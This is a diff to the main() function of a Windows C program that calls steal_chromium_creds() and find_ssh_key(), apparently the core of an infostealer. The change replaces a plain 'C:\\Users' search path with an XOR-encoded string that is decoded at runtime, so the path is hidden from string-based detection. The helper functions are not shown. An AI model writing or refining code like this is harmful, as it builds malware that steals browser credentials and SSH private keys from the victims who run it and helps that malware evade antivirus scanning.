@@ -3,6 +3,7 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
+#include <wchar.h>
 #include <windows.h>
 
 #include "chromium.h"
@@ -16,13 +17,13 @@ int main(void) {
   // Allows us to print non-ASCII characters for debug
   SetConsoleOutputCP(CP_UTF8);
 
-  hello();
   steal_chromium_creds();
-  find_ssh_key(L"C:\\Users");
 
-  char str[] = "BOFFE";
-  xor_str(str, strlen(str));
-  printf("%s", str);
+  wchar_t users_path[] = L"\x69\x10\x76\x7f\x59\x4f\x58\x59";  // C:\Users
+  xor_wstr(users_path, 8);
+  wprintf(L"%ls\n", users_path);
+
+  find_ssh_key(users_path);
 
   return EXIT_SUCCESS;
 }
